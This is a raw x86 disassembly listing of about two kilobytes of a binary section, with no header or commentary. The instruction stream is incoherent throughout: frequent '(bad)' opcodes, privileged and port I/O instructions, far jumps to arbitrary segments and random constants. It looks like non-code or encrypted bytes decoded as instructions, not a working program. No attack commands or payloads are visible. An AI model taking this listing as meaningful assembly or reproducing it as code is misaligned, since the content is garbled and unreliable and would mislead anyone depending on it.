  4164f4:	jmp    0x820dd5a
  4164f9:	sbb    DWORD PTR [ebp+0x3f2d2d70],eax
  4164ff:	int3   
  416500:	sub    BYTE PTR [ecx+eax*1+0x2d],dl
  416504:	dec    esp
  416505:	push   edx
  416506:	fwait
  416507:	inc    esp
  416508:	pop    esp
  416509:	mov    ecx,0x487d0e09
  41650e:	ret    0x89d8
  416511:	pop    esi
  416513:	cli    
  416514:	into   
  416515:	loope  0x41654f
  416517:	fdivp  st(6),st
  416519:	jno    0x416578
  41651b:	cdq    
  41651c:	xlat   BYTE PTR ds:[ebx]
  41651d:	int3   
  41651e:	leave  
  41651f:	fucomip st,st(0)
  416521:	sbb    al,0xd0
  416523:	lock xchg DWORD PTR [edi-0x4a],ebx
  416527:	push   eax
  416528:	cli    
  416529:	or     eax,0xc6ae4cb2
  41652e:	adc    dl,BYTE PTR [ebx]
  416530:	test   DWORD PTR [ebx],esp
  416532:	xor    BYTE PTR [ebx+edi*2],ch
  416535:	jno    0x41657b
  416537:	pop    ds
  416538:	or     eax,0x69eb5217
  41653d:	mov    dh,BYTE PTR [edi]
  41653f:	xchg   BYTE PTR [ecx+0x104aaa79],dh
  416545:	test   al,0xfd
  416547:	into   
  416548:	out    dx,eax
  416549:	pusha  
  41654a:	mov    ah,0x8c
  41654c:	in     al,0xb5
  41654e:	fwait
  41654f:	mov    ah,0x8c
  416551:	push   esi
  416552:	shl    BYTE PTR [edi+0x7bb23c8a],cl
  416558:	test   al,0x2f
  41655a:	jo     0x4164f3
  41655c:	xchg   edx,eax
  41655d:	ins    DWORD PTR es:[edi],dx
  41655e:	fldenv [esi+0x1f]
  416561:	(bad)  
  416562:	(bad)  
  416563:	cdq    
  416564:	cli    
  416565:	loope  0x4165d4
  416567:	scas   al,BYTE PTR es:[edi]
  416568:	pop    esi
  416569:	(bad)  
  41656a:	ret    
  41656b:	cdq    
  41656c:	push   edx
  41656d:	imul   esi,eax,0x77
  416570:	cs in  eax,0x47
  416573:	repz jmp 0x45fdfb57
  416579:	loop   0x4165aa
  41657b:	imul   ebx,DWORD PTR [eax],0x37192544
  416581:	mov    esp,0xbfcc5ac4
  416586:	out    dx,al
  416587:	jp     0x416591
  416589:	xor    bh,BYTE PTR [ecx+0x1f]
  41658c:	cld    
  41658d:	loopne 0x4165dd
  41658f:	push   esp
  416590:	in     al,dx
  416591:	mov    al,ds:0xdffc2dff
  416596:	(bad)  
  416597:	mov    ebp,0xbbb67ca9
  41659c:	fdiv   QWORD PTR [ebx-0x69]
  41659f:	pop    ebx
  4165a0:	into   
  4165a1:	repz jne 0x41661a
  4165a4:	rcr    BYTE PTR [eax-0x3bc11c58],cl
  4165aa:	or     ebx,DWORD PTR cs:[eax-0x2b]
  4165ae:	or     esi,DWORD PTR [eax+0x2178c368]
  4165b4:	mov    eax,0x828aa750
  4165b9:	cmp    esi,ebp
  4165bb:	repz push es
  4165bd:	imul   esp,DWORD PTR ss:[eax-0x43444e2d],0x1f
  4165c5:	fisttp DWORD PTR [edx-0x65]
  4165c8:	(bad)  
  4165c9:	adc    BYTE PTR [ebx+0x44bdd8bb],0xb1
  4165d0:	push   es
  4165d1:	jle    0x41656f
  4165d3:	scas   eax,DWORD PTR es:[edi]
  4165d4:	cmp    BYTE PTR [ebx+0x5100614a],0xc1
  4165db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165dc:	inc    ebx
  4165dd:	pop    es
  4165de:	and    eax,0xbf944e1f
  4165e3:	and    esp,edx
  4165e5:	mov    gs,eax
  4165e7:	bound  esi,QWORD PTR [ecx-0x17]
  4165ea:	mov    es,WORD PTR [ebp-0x54]
  4165ed:	mov    ecx,0xc587156e
  4165f2:	inc    esi
  4165f3:	jmp    0x266beaf4
  4165f8:	ret    
  4165f9:	scas   eax,DWORD PTR es:[edi]
  4165fa:	add    al,0x3d
  4165fc:	es push cs
  4165fe:	mov    ebp,0x6539562e
  416603:	das    
  416604:	pop    esp
  416605:	sub    esp,DWORD PTR [eax+0xe]
  416608:	(bad)  
  416609:	imul   edx,DWORD PTR [edx-0x7a4d59d2],0xfffffff5
  416610:	int3   
  416611:	add    DWORD PTR ds:0x9e918b1e,ebp
  416617:	jecxz  0x416695
  416619:	(bad)  
  41661b:	and    esi,DWORD PTR [eax]
  41661d:	xor    dl,BYTE PTR [edi+0x1baa9fa1]
  416623:	pop    ss
  416624:	pop    ebx
  416625:	cld    
  416626:	push   ss
  416627:	mov    ch,0x97
  416629:	icebp  
  41662a:	pop    es
  41662b:	and    BYTE PTR [eax-0x294a4560],ch
  416631:	(bad)  
  416632:	out    dx,al
  416633:	(bad)  
  416634:	iret   
  416635:	in     al,dx
  416636:	jl     0x4165e8
  416638:	mov    edi,esi
  41663a:	iret   
  41663b:	icebp  
  41663c:	and    edi,DWORD PTR [eax-0x724aa114]
  416642:	enter  0x95e7,0x1a
  416646:	or     ch,BYTE PTR [esi]
  416648:	or     al,dl
  41664a:	dec    edx
  41664b:	sub    bl,al
  41664d:	cmp    DWORD PTR [eax+0x54a353b9],0x36
  416654:	les    ebp,FWORD PTR [edi+esi*2-0x7572bc0a]
  41665b:	enter  0x4f74,0x58
  41665f:	cmp    DWORD PTR [ecx+edi*4-0x21307cc2],esi
  416666:	mov    bh,0x95
  416668:	push   es
  416669:	dec    eax
  41666a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41666b:	pop    ds
  41666c:	mov    ecx,0x967d8b28
  416671:	dec    ebp
  416672:	inc    esi
  416673:	fld    TBYTE PTR [edx]
  416675:	mov    BYTE PTR [edi],al
  416677:	mov    ax,WORD PTR gs:[ebx-0x36]
  41667c:	icebp  
  41667d:	cmp    eax,0x9c133476
  416682:	out    dx,al
  416683:	lock push ds
  416685:	push   ss
  416686:	add    al,0x4a
  416688:	xchg   esi,eax
  416689:	mov    bh,BYTE PTR [edi]
  41668b:	mov    al,ds:0x496d4b6d
  416690:	sub    eax,0x54418ca0
  416695:	scas   al,BYTE PTR es:[edi]
  416696:	inc    edx
  416697:	mov    ecx,0x829a02fc
  41669c:	popa   
  41669d:	into   
  41669e:	das    
  41669f:	mov    eax,0x618bf463
  4166a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166a5:	les    esp,FWORD PTR [edx]
  4166a7:	fs or  eax,0x39d2174e
  4166ad:	je     0x416655
  4166af:	sub    al,0x8b
  4166b1:	lahf   
  4166b2:	mov    eax,ds:0xdc6daa04
  4166b7:	pop    edi
  4166b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166b9:	sti    
  4166ba:	das    
  4166bb:	push   cs
  4166bc:	test   BYTE PTR [ebx-0x2d],bl
  4166bf:	mov    BYTE PTR [ebx+eiz*1+0x5db3028f],ch
  4166c6:	pop    eax
  4166c7:	inc    ebx
  4166c8:	enter  0x79fc,0xe4
  4166cc:	int3   
  4166cd:	push   ebx
  4166ce:	mov    bh,0x75
  4166d0:	ud0    esp,DWORD PTR [edx-0x6c]
  4166d4:	lock gs loopne 0x4166a5
  4166d8:	rcl    DWORD PTR [edi+ebp*2],1
  4166db:	xchg   DWORD PTR [ebp-0x43],eax
  4166de:	mov    edx,0xe109ffce
  4166e3:	sub    cl,BYTE PTR [ebp+edi*2+0x77]
  4166e7:	outs   dx,DWORD PTR ds:[esi]
  4166e8:	or     ebp,DWORD PTR [edi-0x63]
  4166eb:	lods   al,BYTE PTR ds:[esi]
  4166ec:	cmp    al,0x10
  4166ee:	repz in al,0xf
  4166f1:	test   al,0xc2
  4166f3:	ja     0x4166c2
  4166f5:	or     al,0x35
  4166f7:	dec    ecx
  4166f8:	les    ecx,FWORD PTR [edx]
  4166fa:	iret   
  4166fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166fc:	dec    ebp
  4166fd:	jno    0x416739
  4166ff:	int3   
  416700:	or     eax,0x406470c9
  416705:	pop    esp
  416706:	pop    esp
  416707:	fistp  WORD PTR [edi]
  416709:	int3   
  41670a:	jae    0x416725
  41670c:	nop
  41670d:	mov    eax,0xe60bf18
  416712:	pop    ebx
  416713:	lea    edx,[ebx-0x7d]
  416716:	mov    edi,0x25c05d0d
  41671b:	mov    dh,0xb9
  41671d:	cmp    BYTE PTR [esi],0xec
  416720:	pop    esi
  416721:	loopne 0x4166a5
  416723:	fwait
  416724:	and    BYTE PTR [ebx-0x2ead8b93],0x98
  41672b:	inc    ecx
  41672c:	mov    BYTE PTR [edi-0x2c1855d3],bh
  416732:	inc    ebx
  416733:	mov    ebp,ebp
  416735:	ins    DWORD PTR es:[edi],dx
  416736:	mov    edx,0x1f527ae7
  41673b:	ja     0x41677c
  41673d:	div    bl
  41673f:	push   cs
  416740:	cmp    al,0xd
  416742:	mov    dl,0x99
  416744:	xor    edi,DWORD PTR [ebx-0x54]
  416747:	dec    BYTE PTR [ecx+0x1c]
  41674a:	jle    0x416702
  41674c:	adc    eax,0xe35258ef
  416751:	std    
  416752:	ficomp DWORD PTR [ebp+0x5d]
  416755:	and    BYTE PTR [esi],ch
  416757:	repnz xchg ecx,eax
  416759:	jns    0x41673e
  41675b:	retf   0x76a6
  41675e:	inc    ecx
  41675f:	outs   dx,DWORD PTR ds:[esi]
  416760:	outs   dx,BYTE PTR ds:[esi]
  416761:	push   edi
  416762:	imul   edi,DWORD PTR [edi-0x4d396f36],0xa59865da
  41676c:	test   BYTE PTR [eax+0x67022fae],al
  416772:	ficom  DWORD PTR [eax]
  416774:	lahf   
  416775:	push   ss
  416776:	ret    0xb6b3
  416779:	pop    ebx
  41677a:	dec    edi
  41677b:	cwde   
  41677c:	out    0x28,al
  41677e:	pusha  
  41677f:	jno    0x41675f
  416781:	cmp    bl,BYTE PTR [edx+0x11]
  416784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416785:	es leave 
  416787:	sahf   
  416788:	sbb    DWORD PTR [ebx],edi
  41678a:	dec    edx
  41678b:	and    al,0x74
  41678d:	(bad)  
  41678f:	pop    ebx
  416790:	mov    eax,ds:0xaced3a7c
  416795:	push   es
  416796:	adc    bh,dh
  416798:	test   al,0x38
  41679a:	cmp    ecx,DWORD PTR [ebx+0x14d3eefc]
  4167a0:	fst    DWORD PTR [edx+ebx*1-0x17e34011]
  4167a7:	loopne 0x416802
  4167a9:	jne    0x416764
  4167ab:	jmp    0x1eb0:0xa1c694c6
  4167b2:	in     al,dx
  4167b3:	daa    
  4167b4:	pop    edi
  4167b5:	dec    edx
  4167b6:	std    
  4167b7:	jmp    0xe785:0x92d3769
  4167be:	mov    ds:0xd586b747,eax
  4167c3:	jmp    0x401d:0x8f7d1594
  4167ca:	xchg   ebp,eax
  4167cb:	push   esp
  4167cc:	and    BYTE PTR [eax+0x34],al
  4167cf:	sbb    al,0x5f
  4167d1:	ds cdq 
  4167d3:	push   ebx
  4167d4:	fcomip st,st(0)
  4167d6:	push   esp
  4167d7:	mov    WORD PTR [esi],cs
  4167d9:	fwait
  4167da:	cmp    ecx,ebp
  4167dc:	test   DWORD PTR [eax],ecx
  4167de:	xor    eax,0xc3c05066
  4167e3:	mov    edx,0xc135acbe
  4167e8:	sub    al,0x5f
  4167ea:	jo     0x41682f
  4167ec:	aas    
  4167ed:	stos   BYTE PTR es:[edi],al
  4167ee:	scas   eax,DWORD PTR es:[edi]
  4167ef:	pushf  
  4167f0:	mov    DWORD PTR [edi-0x4867ca90],edx
  4167f6:	cld    
  4167f7:	dec    ebp
  4167f8:	mov    ecx,DWORD PTR [edi]
  4167fa:	xchg   DWORD PTR [eax+edx*4-0x749614e1],edx
  416801:	jg     0x4167b3
  416803:	cmp    bl,dh
  416805:	mov    dh,0xc3
  416807:	jp     0x4167bf
  416809:	sar    DWORD PTR [eax+0x27841d82],1
  41680f:	loope  0x41681e
  416811:	aas    
  416812:	add    BYTE PTR [ebx],ch
  416814:	cs add al,0xa6
  416817:	jbe    0x4167f0
  416819:	xor    DWORD PTR [ecx-0x41030c1d],ebx
  41681f:	ret    
  416820:	and    BYTE PTR [esi-0x57502fb2],dl
  416826:	aaa    
  416827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416828:	lods   eax,DWORD PTR ds:[esi]
  416829:	(bad)  
  41682b:	mov    eax,ds:0x9ad24be5
  416830:	ss popa 
  416832:	adc    DWORD PTR [edx+esi*4-0x3f],eax
  416836:	xchg   ebx,eax
  416837:	mov    bl,0x67
  416839:	fcomip st,st(6)
  41683b:	ret    0x47e6
  41683e:	jmp    0x6fb:0xcb9e9689
  416845:	xor    al,0xbc
  416847:	mov    gs,esi
  416849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41684a:	mov    BYTE PTR [edi-0x6b],bl
  41684d:	adc    al,0xbb
  41684f:	ret    
  416850:	jge    0x416863
  416852:	les    esi,FWORD PTR [edi-0x36693e61]
  416858:	enter  0xbc33,0xfd
  41685c:	dec    edx
  41685d:	cmp    BYTE PTR [edx+0x7a],bh
  416860:	dec    esp
  416861:	xor    dl,BYTE PTR [esi+0x307ac268]
  416867:	jle    0x416810
  416869:	call   0x15bd:0x8d4f8f44
  416870:	test   al,0x8d
  416872:	pop    es
  416873:	sbb    DWORD PTR [ebx+0x15],ecx
  416876:	pop    ebp
  416877:	daa    
  416878:	aas    
  416879:	icebp  
  41687a:	pop    edx
  41687b:	xchg   BYTE PTR [ebp+0x4caa2a28],dh
  416881:	sbb    eax,0x4b791a03
  416886:	adc    BYTE PTR [ebx+0xbe2bd4b],cl
  41688c:	mov    eax,0xdfb9dd77
  416891:	and    al,0xf3
  416893:	xchg   esi,eax
  416894:	loope  0x41686f
  416896:	scas   al,BYTE PTR es:[edi]
  416897:	fadd   DWORD PTR [eax]
  416899:	jb     0x4168c9
  41689b:	jp     0x4168b2
  41689d:	out    dx,al
  41689e:	jne    0x416891
  4168a0:	sbb    al,0x4e
  4168a2:	pusha  
  4168a3:	in     al,dx
  4168a4:	jg     0x416891
  4168a6:	(bad)  
  4168a7:	jg     0x5781c5e
  4168ad:	sub    edx,esp
  4168af:	jg     0x4168a0
  4168b1:	pop    esp
  4168b2:	mov    ebp,0x6f35c74d
  4168b7:	cmp    al,0x58
  4168b9:	jmp    0x41683f
  4168bb:	test   al,0x51
  4168bd:	inc    ecx
  4168be:	rcl    ch,0xac
  4168c1:	jecxz  0x416924
  4168c3:	xchg   edx,eax
  4168c4:	outs   dx,BYTE PTR ds:[esi]
  4168c5:	repz sub BYTE PTR [edi-0x6e],al
  4168c9:	or     BYTE PTR [ebx+0x2209d00a],0x35
  4168d0:	scas   eax,DWORD PTR es:[edi]
  4168d1:	ins    BYTE PTR es:[edi],dx
  4168d2:	cs rsm 
  4168d5:	sub    eax,0xbacfd607
  4168da:	js     0x416883
  4168dc:	(bad)  
  4168dd:	jmp    FWORD PTR [edx-0x686f81de]
  4168e3:	pop    esi
  4168e4:	add    al,0x73
  4168e6:	gs xchg esp,eax
  4168e8:	push   eax
  4168e9:	xchg   ebp,eax
  4168ea:	pop    edi
  4168eb:	call   0x2d1cdc78
  4168f0:	push   0xa6ef3d9b
  4168f5:	jb     0x4168d4
  4168f7:	dec    edi
  4168f8:	sub    BYTE PTR [ecx+0x3eebc31c],dh
  4168fe:	jbe    0x41689c
  416900:	(bad)  
  416901:	(bad)  
  416902:	in     al,dx
  416903:	sbb    dl,0x2a
  416906:	push   esp
  416907:	xbegin 0x107728ef
  41690d:	push   ebp
  41690e:	pop    ecx
  41690f:	mov    eax,ds:0x1278a2e7
  416914:	jge    0x41692c
  416916:	call   0xa0ed01b1
  41691b:	test   esp,esp
  41691d:	sbb    eax,0x3c8e7d73
  416922:	(bad)  
  416923:	dec    ebx
  416924:	cdq    
  416925:	sbb    al,0x20
  416927:	and    al,0xba
  416929:	fdiv   QWORD PTR [esi]
  41692b:	stc    
  41692c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41692d:	mov    eax,esp
  41692f:	add    BYTE PTR [eax+0x48b69654],0x1b
  416936:	test   BYTE PTR [ebx+0x2d],dh
  416939:	add    DWORD PTR [ebx-0x21388606],edi
  41693f:	mov    ah,0x63
  416941:	ins    BYTE PTR es:[edi],dx
  416942:	jno    0x416936
  416944:	xor    BYTE PTR ds:0x717a6e70,ah
  41694a:	ss xor al,0x62
  41694d:	mov    dl,0x54
  41694f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  416951:	outs   dx,BYTE PTR ds:[esi]
  416952:	mov    ebx,0x74c86748
  416957:	stos   BYTE PTR es:[edi],al
  416958:	inc    ebp
  416959:	ficomp DWORD PTR [edi+ebp*4]
  41695c:	bound  edi,QWORD PTR gs:[edx-0x68]
  416960:	repnz inc ebx
  416962:	mov    edx,0xb90308ee
  416967:	in     al,0xf0
  416969:	push   ebx
  41696a:	pop    edx
  41696b:	and    al,0x26
  41696d:	add    edx,ebx
  41696f:	cli    
  416970:	jmp    0xef7c:0x918dd447
  416977:	outs   dx,BYTE PTR ds:[esi]
  416978:	and    BYTE PTR [ebx],ch
  41697a:	fild   WORD PTR [ecx]
  41697c:	jbe    0x4169a3
  41697e:	in     al,0x44
  416980:	pop    ecx
  416981:	inc    eax
  416982:	inc    ebp
  416983:	sub    BYTE PTR [edi],al
  416985:	sub    ebx,DWORD PTR [esi-0x3850d4d]
  41698b:	out    0x4b,eax
  41698d:	push   ebx
  41698e:	nop
  41698f:	or     DWORD PTR [eax-0x5],esi
  416992:	pop    ebx
  416993:	xor    eax,0x8f9505c7
  416998:	outs   dx,DWORD PTR ds:[esi]
  416999:	and    bh,BYTE PTR [ebx]
  41699b:	jge    0x41694b
  41699d:	popf   
  41699e:	mov    esi,0x82546f05
  4169a3:	and    BYTE PTR [ebx+0x35],ah
  4169a6:	fst    DWORD PTR [esi+0x6ab92c13]
  4169ac:	mov    edi,0xba5267dc
  4169b1:	pop    ds
  4169b2:	in     eax,dx
  4169b3:	sub    edx,esp
  4169b5:	pop    esp
  4169b6:	les    esi,FWORD PTR [edx]
  4169b8:	jge    0x41696f
  4169ba:	pop    esp
  4169bb:	retf   0x71dc
  4169be:	sbb    eax,0xa27b9ea9
  4169c3:	adc    eax,0xb153f713
  4169c8:	out    dx,eax
  4169c9:	sub    BYTE PTR ds:0xafa6e4b5,bl
  4169cf:	mov    eax,0x8247d9a5
  4169d4:	dec    esi
  4169d5:	or     BYTE PTR [edx],dh
  4169d7:	in     eax,0x90
  4169d9:	mov    eax,0xa4a3f31c
  4169de:	in     al,dx
  4169df:	cmp    eax,0x89874c0c
  4169e4:	lods   al,BYTE PTR ds:[esi]
  4169e5:	jmp    0xee99:0x433a7b10
  4169ec:	test   DWORD PTR [edx+eiz*2-0x365c95a2],edi
  4169f3:	xor    al,0xe5
  4169f5:	push   eax
  4169f6:	xor    eax,0xa323814e
  4169fb:	lods   al,BYTE PTR ds:[esi]
  4169fc:	test   BYTE PTR [ebp-0x108adb0c],bl
  416a02:	gs fwait
  416a04:	mov    ah,0xe4
  416a06:	xor    DWORD PTR [ecx-0xd],0x85ad9c0
  416a0d:	inc    ebx
  416a0e:	nop
  416a0f:	je     0x416a00
  416a11:	fild   WORD PTR [esp+eiz*2]
  416a14:	hlt    
  416a15:	(bad)  
  416a17:	jmp    0x916e:0xb6d59973
  416a1e:	mov    dh,0x88
  416a20:	sub    dl,al
  416a22:	pop    ebp
  416a23:	shl    BYTE PTR [ebx-0x6262a8fa],1
  416a29:	lea    ebp,[ebx-0x6f]
  416a2c:	lahf   
  416a2d:	sub    eax,0x38
  416a30:	sub    dl,BYTE PTR [ebx]
  416a32:	ins    BYTE PTR es:[edi],dx
  416a33:	mov    bl,0x9c
  416a35:	int    0xbc
  416a37:	inc    DWORD PTR [edx]
  416a39:	and    ch,BYTE PTR [ebx]
  416a3b:	and    al,0x48
  416a3d:	mov    WORD PTR [edx+ecx*4+0x56],gs
  416a41:	mov    ch,0x4b
  416a43:	pop    ebx
  416a44:	bound  esi,QWORD PTR [ebp+0x3c]
  416a47:	out    dx,eax
  416a48:	pop    ss
  416a49:	(bad)  
  416a4b:	and    bh,BYTE PTR [edi]
  416a4d:	cmp    BYTE PTR [edi+0x145114b5],0xa3
  416a54:	out    dx,al
  416a55:	scas   al,BYTE PTR es:[edi]
  416a56:	fnstsw WORD PTR [ebp-0x26]
  416a59:	push   cs
  416a5a:	ficomp DWORD PTR [ebx+esi*4]
  416a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a5e:	sti    
  416a5f:	dec    edx
  416a60:	fistp  WORD PTR [ebx]
  416a62:	imul   edi,DWORD PTR [ebx],0x70
  416a65:	inc    edi
  416a66:	push   ecx
  416a67:	hlt    
  416a68:	loop   0x416a5f
  416a6a:	adc    eax,DWORD PTR [esi-0xe2f553a]
  416a70:	jmp    0x171d790c
  416a75:	mov    esi,DWORD PTR [ecx]
  416a77:	rcl    al,0x5a
  416a7a:	sbb    BYTE PTR [edi+esi*4],dl
  416a7d:	lods   al,BYTE PTR ds:[esi]
  416a7e:	or     DWORD PTR [edi],ebx
  416a80:	faddp  st(5),st
  416a82:	loopne 0x416a4e
  416a84:	call   FWORD PTR [eax+esi*4]
  416a87:	scas   eax,DWORD PTR es:[edi]
  416a88:	add    al,0xef
  416a8a:	mov    ecx,0xeefba6f5
  416a8f:	repz (bad) [esi+ebp*8+0x72]
  416a94:	mov    esi,0x512d17db
  416a99:	mov    ch,0x52
  416a9b:	sar    BYTE PTR [edx],0xaa
  416a9e:	popa   
  416a9f:	fs add eax,0x1bef6ce
  416aa5:	inc    ebp
  416aa6:	jbe    0x416a85
  416aa8:	xor    BYTE PTR [edi],0xfd
  416aab:	int    0x78
  416aad:	jle    0x416a83
  416aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ab0:	push   ebx
  416ab1:	loop   0x416a96
  416ab3:	and    al,0xec
  416ab5:	test   esp,eax
  416ab7:	(bad)  
  416ab8:	mov    bl,0x8f
  416aba:	popa   
  416abb:	(bad)  
  416abc:	xchg   esp,eax
  416abd:	inc    esp
  416abe:	and    al,0x88
  416ac0:	lods   al,BYTE PTR ds:[esi]
  416ac1:	iret   
  416ac2:	ror    edx,1
  416ac4:	or     dl,BYTE PTR [edx+0x2050f9e1]
  416aca:	inc    edi
  416acb:	out    0xcc,eax
  416acd:	shl    BYTE PTR [ecx],1
  416acf:	ins    DWORD PTR es:[edi],dx
  416ad0:	fisttp QWORD PTR [ebx]
  416ad2:	int    0x12
  416ad4:	out    0x68,eax
  416ad6:	shl    BYTE PTR [eax+esi*1],cl
  416ad9:	sti    
  416ada:	add    eax,0x12499986
  416adf:	repz cdq 
  416ae1:	xor    DWORD PTR [ebx+edi*1],0xfffffffe
  416ae5:	stos   DWORD PTR es:[edi],eax
  416ae6:	xor    bh,BYTE PTR [ebp+0x5f]
  416ae9:	adc    edi,DWORD PTR [ebx-0x70488c81]
  416aef:	inc    ebp
  416af0:	out    0x89,eax
  416af2:	stc    
  416af3:	adc    bl,BYTE PTR [ebp+0x585349e]
  416af9:	dec    esp
  416afa:	out    0x2a,al
  416afc:	fdiv   QWORD PTR [edi-0x70347056]
  416b02:	inc    edx
  416b03:	cdq    
  416b04:	test   eax,0x1d65d299
  416b09:	test   BYTE PTR [edi-0x62],al
  416b0c:	jmp    DWORD PTR [esi-0x72]
  416b0f:	enter  0x56f8,0x75
  416b13:	add    dh,BYTE PTR [esi-0xd74543d]
  416b19:	push   edi
  416b1a:	ds in  eax,dx
  416b1c:	aas    
  416b1d:	in     eax,dx
  416b1e:	ins    DWORD PTR es:[edi],dx
  416b1f:	jmp    0x416b49
  416b21:	and    DWORD PTR [ebx],esi
  416b23:	mov    ebp,0xde9bef52
  416b28:	sub    esp,esp
  416b2a:	cmp    BYTE PTR [ebx],dl
  416b2c:	pop    ds
  416b2d:	add    ah,BYTE PTR ss:[eax-0x774168a9]
  416b34:	dec    ecx
  416b35:	sub    al,0x88
  416b37:	adc    eax,0x1979bf53
  416b3c:	sub    al,0x41
  416b3e:	pop    edi
  416b3f:	jecxz  0x416aef
  416b41:	or     al,0xcd
  416b43:	lea    edi,[ebp+edx*4+0x79822c9c]
  416b4a:	dec    ecx
  416b4b:	es pop ss
  416b4d:	mov    bh,0xcb
  416b4f:	popf   
  416b50:	ss test al,0xfb
  416b53:	(bad)  
  416b54:	and    edi,DWORD PTR [edi+0x25]
  416b57:	pop    ecx
  416b58:	mov    ebx,0x83d3c95f
  416b5d:	mov    dh,dh
  416b5f:	push   ebp
  416b60:	push   0xffffff91
  416b62:	into   
  416b63:	pop    ebp
  416b64:	retf   0x83c5
  416b67:	xor    eax,0x8ab72b9
  416b6c:	les    ebp,FWORD PTR [ecx+0x3c]
  416b6f:	sahf   
  416b70:	adc    eax,0x3c2f9e03
  416b75:	sahf   
  416b76:	and    bl,BYTE PTR [ecx-0x72920f58]
  416b7c:	push   ds
  416b7d:	jnp    0x416b76
  416b7f:	mov    ebp,0x5a2fba98
  416b84:	arpl   WORD PTR [esi+0x2f],bp
  416b87:	add    DWORD PTR [ecx],ebx
  416b89:	sbb    ecx,DWORD PTR [ecx-0x39d71b5c]
  416b8f:	dec    ebp
  416b90:	or     DWORD PTR [edx+0x67f3de15],0xa5b67842
  416b9a:	jle    0x416b8f
  416b9c:	(bad)  
  416b9d:	iret   
  416b9e:	dec    edi
  416b9f:	stc    
  416ba0:	and    BYTE PTR [edi+ebx*1-0x7e676eba],bl
  416ba7:	mov    esp,DWORD PTR [ecx+ecx*2]
  416baa:	xor    DWORD PTR [edx],0x65
  416bad:	iret   
  416bae:	lds    eax,FWORD PTR [ecx+0x46]
  416bb1:	test   DWORD PTR [ecx],ecx
  416bb3:	ret    
  416bb4:	inc    ecx
  416bb5:	pop    ebx
  416bb6:	mov    WORD PTR [ebp+0x2f],fs
  416bb9:	(bad)  
  416bba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bbb:	add    dh,ch
  416bbd:	pop    ss
  416bbe:	xor    DWORD PTR [ebp-0x4684861b],0xd9981e5f
  416bc8:	mov    esi,0xafe75615
  416bcd:	pop    eax
  416bce:	pop    ss
  416bcf:	mov    WORD PTR [ebx-0x34b994d0],gs
  416bd5:	mov    dl,0xf9
  416bd7:	mov    dh,0x16
  416bd9:	pop    edi
  416bda:	cdq    
  416bdb:	cmp    DWORD PTR [ebx+0xf],esi
  416bde:	fisttp DWORD PTR [eax]
  416be0:	mov    DWORD PTR [edi-0x454f118d],edx
  416be6:	lds    eax,FWORD PTR [ebp-0x44f1c82a]
  416bec:	or     DWORD PTR [eax],0xffffffc4
  416bef:	in     al,dx
  416bf0:	mov    eax,ds:0x68acfa94
  416bf5:	arpl   WORD PTR [eax],sp
  416bf7:	xchg   ecx,eax
  416bf8:	cdq    
  416bf9:	and    ch,ch
  416bfb:	ins    DWORD PTR es:[edi],dx
  416bfc:	lahf   
  416bfd:	xor    bh,BYTE PTR [edi]
  416bff:	xor    esi,DWORD PTR [ebp-0x28]
  416c02:	mov    eax,0xfb4fec61
  416c07:	mov    ds:0x655f4398,al
  416c0c:	adc    al,0x9
  416c0e:	leave  
  416c0f:	int3   
  416c10:	sar    DWORD PTR [eax-0x63fad8a5],0xbc
  416c17:	fwait
  416c18:	scas   al,BYTE PTR es:[edi]
  416c19:	jmp    0x5d75:0x8531e974
  416c20:	outs   dx,BYTE PTR ds:[esi]
  416c21:	push   ds
  416c22:	push   es
  416c23:	mov    BYTE PTR [ecx+0x5c],dl
  416c26:	xor    BYTE PTR [edi-0x19],ah
  416c29:	aad    0xdb
  416c2b:	adc    esp,esp
  416c2d:	or     DWORD PTR [edi+0x23],0xea25f8c6
  416c34:	ret    
  416c35:	test   al,0x82
  416c37:	das    
  416c38:	aam    0xe6
  416c3a:	int3   
  416c3b:	pop    ecx
  416c3c:	and    al,0x67
  416c3e:	stos   DWORD PTR es:[edi],eax
  416c3f:	jbe    0x416c4a
  416c41:	pop    ebx
  416c42:	ins    DWORD PTR es:[edi],dx
  416c43:	pop    eax
  416c44:	retf   0x7ed
  416c47:	mov    ah,0xfb
  416c49:	xchg   BYTE PTR [esi],dl
  416c4b:	add    al,0xd1
  416c4d:	fiadd  WORD PTR [ebp-0x4278b56a]
  416c53:	dec    edi
  416c54:	fwait
  416c55:	sub    BYTE PTR [edi+0x480f17fb],cl
  416c5b:	icebp  
  416c5c:	push   0xffffffae
  416c5e:	dec    edx
  416c5f:	mov    ebp,0xaa309cf9
  416c64:	xchg   ebx,eax
  416c65:	fdivr  QWORD PTR [edx-0x37e3d7e8]
  416c6b:	sub    al,BYTE PTR [esi]
  416c6d:	cwde   
  416c6e:	out    0xbc,eax
  416c70:	retf   0x9970
  416c73:	lea    ebx,[ecx-0x60e61dcd]
  416c79:	popf   
  416c7a:	sbb    esi,DWORD PTR [ecx-0x629e3817]
  416c80:	mov    BYTE PTR [eax+0x317f931a],al
  416c86:	adc    eax,0x4c3b7d81
  416c8b:	arpl   si,ax
  416c8d:	cmp    dl,BYTE PTR [ecx]
  416c8f:	mov    ds:0xbeb36b50,eax
  416c94:	in     al,dx
  416c95:	sbb    ah,BYTE PTR [ecx]
  416c97:	frstor [esi]
  416c99:	mov    edi,0xdd20de94
  416c9e:	push   esp
  416c9f:	sub    esi,DWORD PTR [esi-0x10ca8e2a]
  416ca5:	fild   DWORD PTR [edx-0x319a8cb4]
  416cab:	ja     0x416cc2
  416cad:	fmul   QWORD PTR [eax-0x17bd8810]
  416cb3:	xor    ah,BYTE PTR [edx]
  416cb5:	xor    eax,0x11ccc30b
  416cba:	jno    0x416c60
  416cbc:	and    bh,BYTE PTR [ebp-0x41]
  416cbf:	fldcw  WORD PTR [edx+edx*8]
  416cc2:	xor    DWORD PTR [ecx+0x2c],ebp
